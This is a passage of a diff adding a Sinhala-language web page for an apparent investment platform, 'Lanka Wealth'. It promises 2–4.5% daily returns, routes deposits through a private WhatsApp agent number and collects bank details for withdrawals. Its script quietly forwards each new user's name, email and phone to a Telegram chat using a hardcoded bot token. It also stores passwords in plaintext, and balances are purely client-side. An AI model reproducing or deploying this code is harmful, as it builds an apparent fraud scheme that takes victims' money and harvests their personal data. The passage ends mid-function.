@@ -1,0 +1,1405 @@
+<!DOCTYPE html>
+<html lang="si">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lanka Wealth - Investment Platform</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background: #090d16;
+            color: #f1f5f9;
+            min-height: 100vh;
+            padding: 20px;
+            background-image: radial-gradient(circle at 10% 20%, rgba(37, 99, 235, 0.15) 0%, transparent 40%),
+                              radial-gradient(circle at 90% 80%, rgba(16, 185, 129, 0.15) 0%, transparent 40%);
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        /* Top Bar with Profile */
+        .top-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding: 10px 0;
+        }
+
+        .brand-logo h2 {
+            font-size: 1.8rem;
+            background: linear-gradient(135deg, #38bdf8, #10b981);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .profile-btn {
+            background: #1e293b;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 8px 16px;
+            border-radius: 30px;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .profile-btn:hover {
+            border-color: #38bdf8;
+            background: #273548;
+        }
+
+        .profile-btn img {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+
+        /* Header Style */
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        header h1 {
+            font-size: 2.2rem;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 8px;
+        }
+
+        header p {
+            color: #94a3b8;
+            font-size: 1rem;
+        }
+
+        /* Free Bonus Claim Banner */
+        .bonus-banner {
+            background: linear-gradient(135deg, rgba(16, 185, 129, 0.2), rgba(56, 189, 248, 0.2));
+            border: 1px dashed #10b981;
+            border-radius: 16px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 25px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .bonus-banner-text h3 {
+            color: #10b981;
+            font-size: 1.2rem;
+            margin-bottom: 5px;
+        }
+
+        .bonus-banner-text p {
+            color: #94a3b8;
+            font-size: 0.9rem;
+        }
+
+        .claim-btn {
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: #fff;
+            border: none;
+            padding: 10px 22px;
+            border-radius: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .claim-btn:hover {
+            opacity: 0.9;
+            transform: scale(1.05);
+        }
+
+        .claim-btn:disabled {
+            background: #334155;
+            color: #94a3b8;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Category Navigation Bar */
+        .category-nav {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
+        }
+
+        .cat-btn {
+            background: #1e293b;
+            color: #94a3b8;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            padding: 10px 18px;
+            border-radius: 30px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .cat-btn:hover, .cat-btn.active {
+            background: #38bdf8;
+            color: #090d16;
+            border-color: #38bdf8;
+            box-shadow: 0 0 15px rgba(56, 189, 248, 0.4);
+        }
+
+        /* Dashboard Wallet Card */
+        .wallet-card {
+            background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 20px;
+            padding: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 20px;
+            margin-bottom: 35px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+
+        .wallet-info h3 {
+            color: #94a3b8;
+            font-size: 0.95rem;
+            font-weight: 400;
+            margin-bottom: 5px;
+        }
+
+        .wallet-info .balance {
+            font-size: 2.3rem;
+            font-weight: 700;
+            color: #38bdf8;
+        }
+
+        .wallet-actions {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .action-btn {
+            padding: 12px 24px;
+            border-radius: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            border: none;
+            transition: all 0.3s ease;
+        }
+
+        .btn-deposit {
+            background: #10b981;
+            color: #fff;
+        }
+
+        .btn-deposit:hover {
+            background: #059669;
+        }
+
+        .btn-withdraw {
+            background: transparent;
+            color: #f1f5f9;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .btn-withdraw:hover {
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        /* Active Plans & Withdrawals Top Control Panel */
+        .active-control-panel {
+            background: #111827;
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 25px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .active-control-info h4 {
+            color: #94a3b8;
+            font-size: 0.9rem;
+            margin-bottom: 4px;
+        }
+
+        .active-control-info .total-earn {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: #10b981;
+        }
+
+        .transfer-btn {
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: #fff;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+
+        .transfer-btn:hover {
+            opacity: 0.9;
+        }
+
+        .transfer-btn:disabled {
+            background: #334155;
+            color: #94a3b8;
+            cursor: not-allowed;
+        }
+
+        /* Section Titles */
+        .section-title {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #f8fafc;
+        }
+
+        /* Investment Plans Grid */
+        .plans-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+
+        .plan-card {
+            background: #111827;
+            border-radius: 16px;
+            padding: 25px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            text-align: center;
+            transition: transform 0.3s ease, border-color 0.3s ease;
+        }
+
+        .plan-card:hover {
+            transform: translateY(-5px);
+            border-color: #38bdf8;
+        }
+
+        .plan-price {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: #38bdf8;
+            margin-bottom: 15px;
+        }
+
+        .plan-features-list {
+            list-style: none;
+            margin-bottom: 20px;
+            font-size: 0.9rem;
+            color: #94a3b8;
+            text-align: left;
+        }
+
+        .plan-features-list li, .plan-features-list div {
+            padding: 6px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .plan-features-list span {
+            color: #fff;
+            font-weight: 500;
+        }
+
+        .invest-btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #38bdf8, #0284c7);
+            color: #090d16;
+            font-weight: 700;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+
+        .invest-btn:hover {
+            opacity: 0.9;
+        }
+
+        /* Active Plan Card special styling */
+        .active-plan-card {
+            background: linear-gradient(135deg, #111827 0%, #1a2e3b 100%);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+        }
+
+        .active-badge {
+            display: inline-block;
+            background: rgba(16, 185, 129, 0.2);
+            color: #10b981;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        /* Status Badges */
+        .status-badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+        .status-pending {
+            background: rgba(245, 158, 11, 0.2);
+            color: #f59e0b;
+        }
+        .status-approved {
+            background: rgba(16, 185, 129, 0.2);
+            color: #10b981;
+        }
+
+        /* Withdrawal Info & Support Buttons */
+        .withdrawal-info-box {
+            font-size: 0.85rem;
+            color: #94a3b8;
+            margin-bottom: 12px;
+            line-height: 1.5;
+            text-align: center;
+        }
+
+        .support-btn-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 12px;
+        }
+
+        .support-btn-group button {
+            flex: 1;
+            padding: 10px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 0.85rem;
+            cursor: pointer;
+            border: none;
+            transition: opacity 0.2s;
+        }
+
+        .btn-agent {
+            background: #10b981;
+            color: #fff;
+        }
+
+        .btn-support {
+            background: #38bdf8;
+            color: #090d16;
+        }
+
+        .support-btn-group button:hover {
+            opacity: 0.9;
+        }
+
+        /* Calculator Section */
+        .calculator-container {
+            background: #111827;
+            border-radius: 20px;
+            padding: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            margin-bottom: 40px;
+        }
+
+        .calc-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            align-items: center;
+        }
+
+        @media (max-width: 768px) {
+            .calc-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .input-box {
+            margin-bottom: 20px;
+        }
+
+        .input-box label {
+            display: block;
+            margin-bottom: 8px;
+            color: #94a3b8;
+            font-size: 0.9rem;
+        }
+
+        .input-box select, .input-box input {
+            width: 100%;
+            padding: 14px;
+            background: #1f2937;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            color: #fff;
+            font-size: 1rem;
+            outline: none;
+        }
+
+        .calc-result-box {
+            background: rgba(16, 185, 129, 0.05);
+            border: 1px solid rgba(16, 185, 129, 0.2);
+            border-radius: 16px;
+            padding: 25px;
+            text-align: center;
+        }
+
+        .calc-result-box h4 {
+            color: #10b981;
+            font-size: 1rem;
+            margin-bottom: 10px;
+        }
+
+        .calc-result-box .profit-amount {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #10b981;
+            margin-bottom: 5px;
+        }
+
+        .calc-result-box p {
+            color: #94a3b8;
+            font-size: 0.85rem;
+        }
+
+        /* Modals */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(8px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+
+        .modal-overlay.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .custom-modal {
+            background: #111827;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            width: 90%;
+            max-width: 450px;
+            padding: 30px;
+            position: relative;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+            transform: translateY(20px);
+            transition: transform 0.3s ease;
+        }
+
+        .modal-overlay.active .custom-modal {
+            transform: translateY(0);
+        }
+
+        .close-modal {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: none;
+            border: none;
+            color: #94a3b8;
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
+
+        .profile-header-info {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .profile-header-info img {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            border: 3px solid #38bdf8;
+            object-fit: cover;
+            margin-bottom: 12px;
+        }
+
+        .profile-header-info h3 {
+            font-size: 1.4rem;
+            color: #fff;
+            margin-bottom: 4px;
+        }
+
+        .profile-header-info p {
+            color: #94a3b8;
+            font-size: 0.9rem;
+        }
+
+        .profile-details-list {
+            background: #1e293b;
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+
+        .profile-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            font-size: 0.9rem;
+        }
+
+        .profile-row:last-child {
+            border-bottom: none;
+        }
+
+        .profile-row span {
+            color: #94a3b8;
+        }
+
+        .profile-row strong {
+            color: #fff;
+        }
+
+        .modal-title {
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: #fff;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .modal-desc {
+            color: #94a3b8;
+            font-size: 0.95rem;
+            text-align: center;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+
+        .agent-contact-box {
+            background: #1e293b;
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            border-radius: 12px;
+            padding: 15px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .agent-contact-box p {
+            color: #10b981;
+            font-weight: 600;
+            font-size: 1.1rem;
+            margin-bottom: 5px;
+        }
+
+        .auth-switch {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 0.9rem;
+            color: #94a3b8;
+        }
+
+        .auth-switch span {
+            color: #38bdf8;
+            cursor: pointer;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Top Bar with Profile -->
+        <div class="top-bar">
+            <div class="brand-logo">
+                <h2>Lanka Wealth</h2>
+            </div>
+            <button class="profile-btn" onclick="toggleModal('profileModal')">
+                <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=100&h=100&fit=crop&crop=faces" alt="Profile">
+                <span id="navUserName">User</span>
+            </button>
+        </div>
+
+        <!-- Header -->
+        <header>
+            <h1>ආයෝජන කළමනාකරණ පද්ධතිය</h1>
+            <p>ඔබට අවශ්‍ය නිශ්චිත ආයෝජන සැලසුම පහසුවෙන් තෝරාගන්න</p>
+        </header>
+
+        <!-- Free Bonus Claim Banner -->
+        <div class="bonus-banner">
+            <div class="bonus-banner-text">
+                <h3>🎁 පිළිගැනීමේ ත්‍යාගය (Welcome Bonus)</h3>
+                <p>ඔබගේ නොමිලේ ලැබෙන රු. 100 ක මුදල දැන්ම Claim කරගන්න! (එක් වරක් පමණි)</p>
+            </div>
+            <button class="claim-btn" id="claimBonusBtn" onclick="claimWelcomeBonus()">රු. 100 Claim කරන්න</button>
+        </div>
+
+        <!-- Category Navigation Bar -->
+        <div class="category-nav">
+            <button class="cat-btn active" onclick="filterCategory('all', this)">සියලුම සැලසුම්</button>
+            <button class="cat-btn" onclick="filterCategory('starter', this)">Starter (600 - 3K)</button>
+            <button class="cat-btn" onclick="filterCategory('growth', this)">Growth (4K - 7K)</button>
+            <button class="cat-btn" onclick="filterCategory('vip', this)">VIP / Elite (8K+)</button>
+            <button class="cat-btn" onclick="filterCategory('active', this)" style="border-color: #10b981; color: #10b981;">⚡ Active Plans</button>
+            <button class="cat-btn" onclick="filterCategory('withdrawals', this)" style="border-color: #f59e0b; color: #f59e0b;">🏦 Withdrawals</button>
+        </div>
+
+        <!-- Wallet Dashboard -->
+        <div class="wallet-card">
+            <div class="wallet-info">
+                <h3>මුළු ගිණුම් ශේෂය (Main Balance)</h3>
+                <div class="balance" id="walletBalance">රු. 0.00</div>
+            </div>
+            <div class="wallet-actions">
+                <button class="action-btn btn-deposit" onclick="toggleModal('depositModal')">මුදල් තැන්පත් කරන්න</button>
+                <button class="action-btn btn-withdraw" onclick="toggleModal('withdrawModal')">මුදල් ලබාගන්න</button>
+            </div>
+        </div>
+
+        <!-- Dynamic Top Container for Active Plans / Withdrawals View -->
+        <div id="activeTopContainer"></div>
+
+        <!-- Investment Plans & Active Plans Section -->
+        <h2 class="section-title" id="sectionHeading">✨ ආයෝජන සැලසුම් (Investment Plans)</h2>
+        <div class="plans-grid" id="plansGrid">
+            <!-- Plans generated by JavaScript -->
+        </div>
+
+        <!-- Profit Calculator -->
+        <h2 class="section-title">📊 ලාභ ගණක යන්ත්‍රය (Profit Calculator)</h2>
+        <div class="calculator-container">
+            <div class="calc-grid">
+                <div>
+                    <div class="input-box">
+                        <label>ආයෝජන පැකේජය තෝරන්න:</label>
+                        <select id="calcPackage" onchange="calculateReturns()">
+                            <!-- Options generated dynamically -->
+                        </select>
+                    </div>
+                </div>
+                <div class="calc-result-box">
+                    <h4>ඇස්තමේන්තුගත මුළු ලාභය (දින 30)</h4>
+                    <div class="profit-amount" id="totalProfitOutput">රු. 0.00</div>
+                    <p id="dailyProfitOutput">දෛනික ලාභය: රු. 0.00</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 1. Authentication Modal (Login / Register) -->
+    <div class="modal-overlay active" id="authModal">
+        <div class="custom-modal" id="loginFormContainer">
+            <div class="modal-title">🔐 ගිණුමට පිවිසෙන්න (Login)</div>
+            <p class="modal-desc">ඔබගේ ගිණුම් විස්තර ඇතුළත් කර ඉදිරියට යන්න.</p>
+            <div class="input-box">
+                <label>විද්‍යුත් තැපෑල (Email):</label>
+                <input type="email" id="loginEmail" placeholder="example@gmail.com">
+            </div>
+            <div class="input-box">
+                <label>මුරපදය (Password):</label>
+                <input type="password" id="loginPassword" placeholder="••••••••">
+            </div>
+            <button class="invest-btn" onclick="handleLogin()">ලොග් වන්න (Login)</button>
+            <div class="auth-switch">
+                ගිණුමක් නොමැ니까? <span onclick="switchAuthForm('register')">නව ගිණුමක් සාදාගන්න (Register)</span>
+            </div>
+        </div>
+
+        <div class="custom-modal" id="registerFormContainer" style="display: none;">
+            <div class="modal-title">📝 නව ගිණුම් ලියාපදිංචිය (Register)</div>
+            <p class="modal-desc">Lanka Wealth සමඟ සම්බන්ධ වීමට ඔබේ තොරතුරු පුරවන්න.</p>
+            <div class="input-box">
+                <label>සම්පූර්ණ නම (Full Name):</label>
+                <input type="text" id="regName" placeholder="උදා: Prakash Lakshan">
+            </div>
+            <div class="input-box">
+                <label>විද්‍යුත් තැපෑල (Email):</label>
+                <input type="email" id="regEmail" placeholder="example@gmail.com">
+            </div>
+            <div class="input-box">
+                <label>දුරකථන අංකය (Phone Number):</label>
+                <input type="text" id="regPhone" placeholder="+94 77 123 4567">
+            </div>
+            <div class="input-box">
+                <label>මුරපදය (Password):</label>
+                <input type="password" id="regPassword" placeholder="••••••••">
+            </div>
+            <button class="invest-btn" onclick="handleRegister()">ගිණුම සාදන්න (Sign Up)</button>
+            <div class="auth-switch">
+                දැන්ම ගිණුමක් තිබේද? <span onclick="switchAuthForm('login')">ලොග් වන්න (Login)</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- 2. Profile System Modal -->
+    <div class="modal-overlay" id="profileModal">
+        <div class="custom-modal">
+            <button class="close-modal" onclick="toggleModal('profileModal')">&times;</button>
+            <div class="profile-header-info">
+                <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&h=150&fit=crop&crop=faces" alt="Profile">
+                <h3 id="modalUserName">User</h3>
+                <p>ප්‍රිමියම් ගිණුම් සාමාජික</p>
+            </div>
+            <div class="profile-details-list">
+                <div class="profile-row">
+                    <span>ගිණුම් අංකය (ID):</span>
+                    <strong id="profileAccNo">#LW-00000</strong>
+                </div>
+                <div class="profile-row">
+                    <span>විද්‍යුත් තැපෑල:</span>
+                    <strong id="profileEmail">-</strong>
+                </div>
+                <div class="profile-row">
+                    <span>දුරකථන අංකය:</span>
+                    <strong id="profilePhone">-</strong>
+                </div>
+                <div class="profile-row">
+                    <span>සක්‍රීය පැකේජ ගණන:</span>
+                    <strong id="activePlansCount">0 ක්</strong>
+                </div>
+            </div>
+            <button class="invest-btn" style="background: #ef4444; color: #fff; margin-bottom: 10px;" onclick="handleLogout()">පිටවීම (Logout)</button>
+            <button class="invest-btn" onclick="toggleModal('profileModal');">වසන්න</button>
+        </div>
+    </div>
+
+    <!-- 3. Deposit Notice Modal -->
+    <div class="modal-overlay" id="depositModal">
+        <div class="custom-modal">
+            <button class="close-modal" onclick="toggleModal('depositModal')">&times;</button>
+            <div class="modal-title">💳 මුදල් තැන්පත් කිරීම (Deposit Notice)</div>
+            <p class="modal-desc">ඩිපොසිට් කිරීම සඳහා දැන්ම අපගේ නිල නියෝජිතයා (Agent) හා සම්බන්ධ වන්න.</p>
+            <div class="agent-contact-box">
+                <p>📞 නිල නියෝජිත අංකය:</p>
+                <strong>+94 72 593 9056</strong>
+            </div>
+            <p class="modal-desc" style="font-size: 0.85rem;">WhatsApp හෝ ඇමතුමක් මඟින් සම්බන්ධ වී මුදල් තැන්පත් කරවා ගන්න.</p>
+            <button class="invest-btn" onclick="toggleModal('depositModal')">තේරුම් ගත්තා</button>
+        </div>
+    </div>
+
+    <!-- 4. Withdrawal System Modal -->
+    <div class="modal-overlay" id="withdrawModal">
+        <div class="custom-modal">
+            <button class="close-modal" onclick="toggleModal('withdrawModal')">&times;</button>
+            <div class="modal-title">🏦 මුදල් ආපසු ගැනීම (Withdrawal)</div>
+            <p class="modal-desc" style="font-size: 0.85rem; margin-bottom: 15px;">අවම මුදල රු. 1,500ක් වන අතර උපරිම මුදල රු. 25,000කි.</p>
+            <div class="input-box">
+                <label>ලබාගත යුතු මුදල (රු. 1,500 - 25,000):</label>
+                <input type="number" id="withdrawAmount" placeholder="උදා: 5000">
+            </div>
+            <div class="input-box">
+                <label>බැංකුවේ නම සහ ශාඛාව:</label>
+                <input type="text" id="bankName" placeholder="උදා: BOC - Matara">
+            </div>
+            <div class="input-box">
+                <label>ගිණුම් අංකය:</label>
+                <input type="text" id="accountNo" placeholder="ඔබේ බැංකු ගිණුම් අංකය">
+            </div>
+            <button class="invest-btn" onclick="processWithdrawal()">ඉල්ලුම් කරන්න (Submit Withdrawal)</button>
+        </div>
+    </div>
+
+    <script>
+        // Telegram Bot Configuration
+        const TELEGRAM_BOT_TOKEN = "8772158494:AAFbFTAPXcnjgDOxJS8i7LMxRDQVb8iOvrA";
+        const TELEGRAM_CHAT_ID = "8441230005";
+
+        function sendTelegramMessage(text) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: text,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Telegram Notification Sent:', data);
+            })
+            .catch(error => {
+                console.error('Telegram Error:', error);
+            });
+        }
+
+        // App State Variables (Per-User Separated Data System)
+        let registeredUsers = JSON.parse(localStorage.getItem('lw_registeredUsers')) || [];
+        let loggedInEmail = localStorage.getItem('lw_loggedInEmail') || null;
+
+        let mainBalance = 0.00;
+        let bonusClaimed = false;
+        let userActiveInvestments = [];
+        let userWithdrawals = [];
+        let currentFilter = 'all';
+        let currentUserId = "#LW-00000";
+
+        // Investment packages data
+        const packages = [
+            { amount: 600, dailyRate: 2.0, days: 30, category: 'starter' },
+            { amount: 1000, dailyRate: 2.2, days: 30, category: 'starter' },
+            { amount: 1500, dailyRate: 2.5, days: 30, category: 'starter' },
+            { amount: 2000, dailyRate: 2.8, days: 30, category: 'starter' },
+            { amount: 3000, dailyRate: 3.0, days: 30, category: 'starter' },
+            { amount: 4000, dailyRate: 3.2, days: 30, category: 'growth' },
+            { amount: 5000, dailyRate: 3.5, days: 30, category: 'growth' },
+            { amount: 6000, dailyRate: 3.8, days: 30, category: 'growth' },
+            { amount: 7000, dailyRate: 4.0, days: 30, category: 'growth' },
+            { amount: 8000, dailyRate: 4.2, days: 30, category: 'vip' },
+            { amount: 9000, dailyRate: 4.35, days: 30, category: 'vip' },
+            { amount: 10000, dailyRate: 4.5, days: 30, category: 'vip' }
+        ];
+
+        let currentUser = {
+            name: "User",
+            email: "",
+            phone: "",
+            accNo: "#LW-00000"
+        };
+
+        // Check if today is Monday (1) or Tuesday (2)
+        function isTransferAllowedToday() {
+            const today = new Date().getDay(); // 1 = Monday, 2 = Tuesday
+            return (today === 1 || today === 2);
+        }
+
+        // Load specific user data from localStorage based on email key
+        function loadUserData(email) {
+            let userData = JSON.parse(localStorage.getItem('lw_user_data_' + email));
+            if (userData) {
+                mainBalance = userData.mainBalance;
+                bonusClaimed = userData.bonusClaimed;
+                userActiveInvestments = userData.userActiveInvestments;
+                userWithdrawals = userData.userWithdrawals;
+                currentUser = userData.currentUser;
+                currentUserId = currentUser.accNo;
+            } else {
+                mainBalance = 0.00;
+                bonusClaimed = false;
+                userActiveInvestments = [];
+                userWithdrawals = [];
+            }
+        }
+
+        // Save current user data into their unique storage key
+        function saveUserData() {
+            if (!currentUser.email) return;
+            let userData = {
+                mainBalance,
+                bonusClaimed,
+                userActiveInvestments,
+                userWithdrawals,
+                currentUser
+            };
+            localStorage.setItem('lw_user_data_' + currentUser.email, JSON.stringify(userData));
+        }
+
+        // Switch between Login and Register Forms
+        function switchAuthForm(formType) {
+            if (formType === 'register') {
+                document.getElementById('loginFormContainer').style.display = 'none';
+                document.getElementById('registerFormContainer').style.display = 'block';
+            } else {
+                document.getElementById('registerFormContainer').style.display = 'none';
+                document.getElementById('loginFormContainer').style.display = 'block';
+            }
+        }
+
+        // Handle Register Action
+        function handleRegister() {
+            let name = document.getElementById('regName').value.trim();
+            let email = document.getElementById('regEmail').value.trim();
+            let phone = document.getElementById('regPhone').value.trim();
+            let pass = document.getElementById('regPassword').value.trim();
+
+            if (!name || !email || !phone || !pass) {
+                alert("කරුණාකර සියලුම විස්තර නිවැරදිව පුරවන්න!");
+                return;
+            }
+
+            let existing = registeredUsers.find(u => u.email === email);
+            if (existing) {
+                alert("මෙම විද්‍යුත් තැපෑලෙන් දැනටමත් ගිණුමක් ලියාපදිංචි කර ඇත. කරුණාකර ලොග් වන්න!");
+                switchAuthForm('login');
+                return;
+            }
+
+            let newAccNo = "#LW-" + Math.floor(10000 + Math.random() * 90000);
+
+            let newUserRecord = {
+                name,
+                email,
+                phone,
+                pass,
+                accNo: newAccNo
+            };
+
+            registeredUsers.push(newUserRecord);
+            localStorage.setItem('lw_registeredUsers', JSON.stringify(registeredUsers));
+
+            currentUser = { name, email, phone, accNo: newAccNo };
+            currentUserId = newAccNo;
+            mainBalance = 0.00;
+            bonusClaimed = false;
+            userActiveInvestments = [];
+            userWithdrawals = [];
+            saveUserData();
+
+            localStorage.setItem('lw_loggedInEmail', email);
+            loggedInEmail = email;
+
+            let regMsg = `🚀 *නව ගිණුම් ලියාපදිංචියක් (New Registration)*\n\n` +
+                         `👤 නම: ${name}\n` +
+                         `🆔 ගිණුම් අංකය: ${newAccNo}\n` +
+                         `📧 විද්‍යුත් තැපෑල: ${email}\n` +
+                         `📞 දුරකථන අංකය: ${phone}`;
+            sendTelegramMessage(regMsg);
+
+            updateUIUserData();
+            updateWalletUI();
+            updateBonusButtonUI();
+            renderApp('all');
+
+            document.getElementById('authModal').classList.remove('active');
+            alert("සුභ පැතුම්! ගිණුම සාර්ථකව සාදන ලදී.");
+        }
+
+        // Handle Login Action
+        function handleLogin() {
+            let email = document.getElementById('loginEmail').value.trim();
+            let pass = document.getElementById('loginPassword').value.trim();
+
+            if (!email || !pass) {
+                alert("කරුණාකර විද්‍යුත් තැපෑල සහ මුරපදය ඇතුළත් කරන්න!");
+                return;
+            }
+
+            let foundUser = registeredUsers.find(u => u.email === email && u.pass === pass);
+            if (!foundUser) {
+                alert("වැරදි විද්‍යුත් තැපෑලක් හෝ මුරපදයක්! කරුණාකර නිවැරදිව ඇතුළත් කරන්න හෝ නව ගිණුමක් සාදාගන්න.");
+                return;
+            }
+
+            currentUser = {
+                name: foundUser.name,
+                email: foundUser.email,
+                phone: foundUser.phone,
+                accNo: foundUser.accNo
+            };
+            currentUserId = foundUser.accNo;
+
+            loggedInEmail = email;
+            localStorage.setItem('lw_loggedInEmail', email);
+
+            loadUserData(email);
+
+            updateUIUserData();
+            updateWalletUI();
+            updateBonusButtonUI();
+            renderApp('all');
+
+            document.getElementById('authModal').classList.remove('active');
+            alert("සාර්ථකව ගිණුමට පිවිසෙන ලදී!");
+        }
+
+        // Logout Action
+        function handleLogout() {
+            localStorage.removeItem('lw_loggedInEmail');
+            loggedInEmail = null;
+            toggleModal('profileModal');
+            document.getElementById('authModal').classList.add('active');
+            switchAuthForm('login');
+        }
+
+        // Update User Details on UI
+        function updateUIUserData() {
+            document.getElementById('navUserName').innerText = currentUser.name;
+            document.getElementById('modalUserName').innerText = currentUser.name;
+            document.getElementById('profileEmail').innerText = currentUser.email;
+            document.getElementById('profilePhone').innerText = currentUser.phone;
+            document.getElementById('profileAccNo').innerText = currentUser.accNo;
+            document.getElementById('activePlansCount').innerText = `${userActiveInvestments.length} ක්`;
+        }
+
+        // Update Wallet Display on Screen
+        function updateWalletUI() {
+            document.getElementById('walletBalance').innerText = `රු. ${mainBalance.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
+        }
+
+        // Update Bonus Button UI based on claim status
+        function updateBonusButtonUI() {
+            let btn = document.getElementById('claimBonusBtn');
+            if (bonusClaimed) {
+                btn.innerText = "Claimed ✓";
+                btn.disabled = true;
+            } else {
+                btn.innerText = "රු. 100 Claim කරන්න";
+                btn.disabled = false;
+            }
+        }
+
+        // Claim Welcome Bonus Function
+        function claimWelcomeBonus() {
+            if (bonusClaimed) {
+                alert("ඔබ දැනටමත් මෙම බෝනස් මුදල ලබාගෙන ඇත! එය ලබාගත හැක්කේ එක් වරක් පමණි.");
+                return;
+            }
+
+            mainBalance += 100.00;
+            bonusClaimed = true;
+            saveUserData();
+            updateWalletUI();
+            updateBonusButtonUI();
+
+            alert("සුභ පැතුම්! නොමිලේ ලැබුණු රු. 100 ක බෝනස් මුදල ඔබේ ප්‍රධාන ගිණුමට එකතු විය!");
+        }
+
+        // Render Plans, Active Plans, and Withdrawals
+        function renderApp(filteredCategory = 'all') {
